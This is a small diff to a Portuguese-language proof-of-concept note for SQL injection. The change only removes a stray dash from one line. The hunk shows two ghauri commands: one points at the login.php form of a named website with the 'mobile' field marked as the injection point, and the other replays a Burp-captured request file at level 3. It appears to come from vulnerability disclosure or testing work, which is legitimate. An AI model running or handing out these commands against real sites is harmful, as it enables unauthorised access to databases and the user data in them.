@@ -9,5 +9,5 @@ Comando terminal (POC):
 
    ghauri -u 'https://omnibookslibrary.com/login.php' --data "mobile=*&password=test&login=" --batch --flush-session
 
-   -Criar um arquivo poc.txt com a requisição, o conteúdo é o mesmo utilizado no BURP.
+   Criar um arquivo poc.txt com a requisição, o conteúdo é o mesmo utilizado no BURP.
    ghauri -r poc.txt --batch --level 3
